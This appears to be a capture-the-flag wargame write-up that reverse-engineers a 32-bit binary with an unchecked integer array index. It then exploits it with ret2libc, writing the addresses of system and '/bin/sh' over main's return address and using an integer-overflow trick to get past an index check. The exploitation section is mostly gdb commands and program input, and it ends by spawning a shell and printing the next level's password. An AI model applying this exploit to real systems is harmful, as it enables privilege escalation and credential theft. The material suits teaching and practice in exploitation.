# BUFFER OVERFLOW ON AN ARRAY OF INT WITH NO BOUNDS CHECKING

## Reverse engineering

### Main function

```asm
 8048878:	8d 84 24 b8 01 00 00 	lea    eax,[esp+0x1b8]
 804887f:	89 04 24             	mov    DWORD PTR [esp],eax
 8048882:	e8 19 fc ff ff       	call   80484a0 <fgets@plt>
```
- Stores an input at the address [esp+0x1b8]

```asm
 8048887:	8d 84 24 b8 01 00 00 	lea    eax,[esp+0x1b8]
 804888e:	c7 44 24 14 ff ff ff 	mov    DWORD PTR [esp+0x14],0xffffffff
 8048895:	ff 
 8048896:	89 c2                	mov    edx,eax
 8048898:	b8 00 00 00 00       	mov    eax,0x0
 804889d:	8b 4c 24 14          	mov    ecx,DWORD PTR [esp+0x14]
 80488a1:	89 d7                	mov    edi,edx
 80488a3:	f2 ae                	repnz scas al,BYTE PTR es:[edi]
 80488a5:	89 c8                	mov    eax,ecx
 80488a7:	f7 d0                	not    eax
```
- Put a null byte at the end of the input string

```shell
(gdb) p (char*) 0x8048d5b
$1 = 0x8048d5b "store"
(gdb) p (char*) 0x8048d61
$2 = 0x8048d61 "read"
(gdb) p (char*) 0x8048d66
$3 = 0x8048d66 "quit"
```
```asm
 80488c0:	b8 5b 8d 04 08       	mov    eax,0x8048d5b
 80488c5:	b9 05 00 00 00       	mov    ecx,0x5
 80488ca:	89 d6                	mov    esi,edx
 80488cc:	89 c7                	mov    edi,eax
 80488ce:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 80488d0:	0f 97 c2             	seta   dl
 80488d3:	0f 92 c0             	setb   al
 80488d6:	89 d1                	mov    ecx,edx
 80488d8:	28 c1                	sub    cl,al
 80488da:	89 c8                	mov    eax,ecx
 80488dc:	0f be c0             	movsx  eax,al
 80488df:	85 c0                	test   eax,eax
 80488e1:	75 15                	jne    80488f8 <main+0x1d5>
 80488e3:	8d 44 24 24          	lea    eax,[esp+0x24]
 80488e7:	89 04 24             	mov    DWORD PTR [esp],eax
 80488ea:	e8 41 fd ff ff       	call   8048630 <store_number>
```
- If the input is "store", call the function store_number with it

```asm
 8048901:	b8 61 8d 04 08       	mov    eax,0x8048d61
 8048906:	b9 04 00 00 00       	mov    ecx,0x4
 804890b:	89 d6                	mov    esi,edx
 804890d:	89 c7                	mov    edi,eax
 804890f:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 8048911:	0f 97 c2             	seta   dl
 8048914:	0f 92 c0             	setb   al
 8048917:	89 d1                	mov    ecx,edx
 8048919:	28 c1                	sub    cl,al
 804891b:	89 c8                	mov    eax,ecx
 804891d:	0f be c0             	movsx  eax,al
 8048920:	85 c0                	test   eax,eax
 8048922:	75 15                	jne    8048939 <main+0x216>
 8048924:	8d 44 24 24          	lea    eax,[esp+0x24]
 8048928:	89 04 24             	mov    DWORD PTR [esp],eax
 804892b:	e8 a7 fd ff ff       	call   80486d7 <read_number>
```
- If it's "read", call the function read_number with it

```asm
 8048942:	b8 66 8d 04 08       	mov    eax,0x8048d66
 8048947:	b9 04 00 00 00       	mov    ecx,0x4
 804894c:	89 d6                	mov    esi,edx
 804894e:	89 c7                	mov    edi,eax
 8048950:	f3 a6                	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
 8048952:	0f 97 c2             	seta   dl
 8048955:	0f 92 c0             	setb   al
 8048958:	89 d1                	mov    ecx,edx
 804895a:	28 c1                	sub    cl,al
 804895c:	89 c8                	mov    eax,ecx
 804895e:	0f be c0             	movsx  eax,al
 8048961:	85 c0                	test   eax,eax
 8048963:	74 6a                	je     80489cf <main+0x2ac>
```
- If it's "quit", go to the end of the main function

### Store_number function

```shell
(gdb) p (char*) 0x8048ad3
$4 = 0x8048ad3 " Number: "
```
```asm
08048630 <store_number>:
 ...
 8048644:	b8 d3 8a 04 08       	mov    eax,0x8048ad3
 8048649:	89 04 24             	mov    DWORD PTR [esp],eax
 804864c:	e8 1f fe ff ff       	call   8048470 <printf@plt>
 8048651:	e8 91 ff ff ff       	call   80485e7 <get_unum>
 8048656:	89 45 f0             	mov    DWORD PTR [ebp-0x10],eax
 8048659:	b8 dd 8a 04 08       	mov    eax,0x8048add
 804865e:	89 04 24             	mov    DWORD PTR [esp],eax
 8048661:	e8 0a fe ff ff       	call   8048470 <printf@plt>
 8048666:	e8 7c ff ff ff       	call   80485e7 <get_unum>
 804866b:	89 45 f4             	mov    DWORD PTR [ebp-0xc],eax
```
- Print context string then call get_unum to get a number, twice, and the returned value is stored in [ebp-0x10] and [ebp-0xc] respectively

```asm
 804866e:	8b 4d f4             	mov    ecx,DWORD PTR [ebp-0xc]
 8048671:	ba ab aa aa aa       	mov    edx,0xaaaaaaab
 8048676:	89 c8                	mov    eax,ecx
 8048678:	f7 e2                	mul    edx
 804867a:	d1 ea                	shr    edx,1
 804867c:	89 d0                	mov    eax,edx
 804867e:	01 c0                	add    eax,eax
 8048680:	01 d0                	add    eax,edx
 8048682:	89 ca                	mov    edx,ecx
 8048684:	29 c2                	sub    edx,eax
 8048686:	85 d2                	test   edx,edx
 8048688:	74 0d                	je     8048697 <store_number+0x67>
```
- `0xaaaaaaab` is a magic number used to compute the modulo of a number by 3
- Its checking if the second number written is a multiple of 3, if it is, it jumps to the error part of the function
- If we want to store, the index cannot be a multiple of 3

```shell
(gdb) p (char*) 0x8048af8
$5 = 0x8048af8 "   This index is reserved for wil!"
(gdb) p (char*) 0x8048ae6
$6 = 0x8048ae6 " *** ERROR! ***"
```
```asm
 804868a:	8b 45 f0             	mov    eax,DWORD PTR [ebp-0x10]
 804868d:	c1 e8 18             	shr    eax,0x18
 8048690:	3d b7 00 00 00       	cmp    eax,0xb7
 8048695:	75 2b                	jne    80486c2 <store_number+0x92>
 8048697:	c7 04 24 e6 8a 04 08 	mov    DWORD PTR [esp],0x8048ae6
 804869e:	e8 1d fe ff ff       	call   80484c0 <puts@plt>
 80486a3:	c7 04 24 f8 8a 04 08 	mov    DWORD PTR [esp],0x8048af8
 80486aa:	e8 11 fe ff ff       	call   80484c0 <puts@plt>
 80486af:	c7 04 24 e6 8a 04 08 	mov    DWORD PTR [esp],0x8048ae6
 80486b6:	e8 05 fe ff ff       	call   80484c0 <puts@plt>
 80486bb:	b8 01 00 00 00       	mov    eax,0x1
 80486c0:	eb 13                	jmp    80486d5 <store_number+0xa5>
```
- The error part prints an error message and stores 1 in the return value register (eax)

```asm
 80486c2:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 80486c5:	c1 e0 02             	shl    eax,0x2
 80486c8:	03 45 08             	add    eax,DWORD PTR [ebp+0x8]
 80486cb:	8b 55 f0             	mov    edx,DWORD PTR [ebp-0x10]
 80486ce:	89 10                	mov    DWORD PTR [eax],edx
 80486d0:	b8 00 00 00 00       	mov    eax,0x0
 80486d5:	c9                   	leave  
 80486d6:	c3                   	ret    
```
- Otherwise, it takes the first number and store it at DWORD PTR [ebp+0x8] + (second number << 2)
- Left-shifting by 2 means multiplying by 4

### Get_unum function

```shell
(gdb) p (char*) 0x8048ad0
$7 = 0x8048ad0 "%u"
```
```asm
080485e7 <get_unum>:
 80485e7:	55                   	push   ebp
 80485e8:	89 e5                	mov    ebp,esp
 80485ea:	83 ec 28             	sub    esp,0x28
 80485ed:	c7 45 f4 00 00 00 00 	mov    DWORD PTR [ebp-0xc],0x0
 80485f4:	a1 60 a0 04 08       	mov    eax,ds:0x804a060
 80485f9:	89 04 24             	mov    DWORD PTR [esp],eax
 80485fc:	e8 7f fe ff ff       	call   8048480 <fflush@plt>
 8048601:	b8 d0 8a 04 08       	mov    eax,0x8048ad0
 8048606:	8d 55 f4             	lea    edx,[ebp-0xc]
 8048609:	89 54 24 04          	mov    DWORD PTR [esp+0x4],edx
 804860d:	89 04 24             	mov    DWORD PTR [esp],eax
 8048610:	e8 eb fe ff ff       	call   8048500 <__isoc99_scanf@plt>
 8048615:	e8 aa ff ff ff       	call   80485c4 <clear_stdin>
 804861a:	8b 45 f4             	mov    eax,DWORD PTR [ebp-0xc]
 804861d:	c9                   	leave  
 804861e:	c3                   	ret    
```
- This function mainly calls scanf to return an unsigned integer
- Flushing stdin before and clearing it after
- No vulnerability in this function, does its job correctly

## Exploitation

The program is vulnerable because it allows to write a not bounded number at an arbitrary index of a buffer, we can write outside of the table (e.g. on the return address of the main function).

### A plan

- (1) Find the address of the system function and the string "/bin/sh" in libc
- (2) Find the index of the return address of the main function
- (3) Store the address of the system function at the index of the return address
- (4) Store a random value right after it (will be executed after system returns)
- (5) Store the address of the string "/bin/sh" right after it (is passed to system as argument)

#### **1**

```shell
(gdb) b main
(gdb) run
(gdb) p system
$1 = {<text variable, no debug info>} 0xf7e6aed0 <system>
(gdb) info proc mappings
...
	0xf7e2c000 0xf7fcc000   0x1a0000        0x0 /lib32/libc-2.15.so
...
(gdb) find 0xf7e2c000, 0xf7fcc000, "/bin/sh" 
0xf7f897ec
1 pattern found.
```
- system    address : 0xf7e6aed0 -> 4159090384 in decimal
- "/bin/sh" address : 0xf7f897ec -> 4160264172 in decimal

#### **2**

```asm
0x080489f1 <+718>:	ret 
```
- We return to the main function at 0x080489f1, break it to see where the return address is stored

```asm
08048630 <store_number>:
...
 0x080486c5 <+149>:  shl    eax,0x2
 0x080486ce <+158>:	 mov    %edx,(%eax)      
```
- We can break here to see where the number is stored

```shell
(gdb) b *0x080486ce
(gdb) b *0x080489f1
(gdb) run
(gdb) p/x $eax
$1 = 0xffffd548
(gdb) c
(gdb) info frame
    Saved registers:
        eip at 0xffffd70c
(gdb) p/x $esp                                    
$1 = 0xffffd70c                             
```
- To write on the eip we need to write at the index : 1 + (0xffffd70c - 0xffffd548) / 4 = 114
- 114 is a multiple of 3, so we cannot use it directly
- But `<< 2` means that we can set a bit at the first position on the left of the number, it will be lost in the shift
- 114 + 2^31 = 2147483762, its not a multiple of 3, so we can use it
- The next 115 and 116 positions are not multiples of 3, so we can use them directly

#### **3** **4** **5**

```shell
Input command: store
 Number: 4159090384
 Index: 2147483762
 Completed store command successfully
Input command: store
 Number: 1234
 Index: 115
 Completed store command successfully
Input command: store
 Number: 4160264172
 Index: 116
 Completed store command successfully
Input command: quit
$ whoami  
level08
$ cat /home/users/level08/.pass
7WJ6jFBzrcjEYXudxnM3kdW7n3qyxR6tk2xGrkSC
```
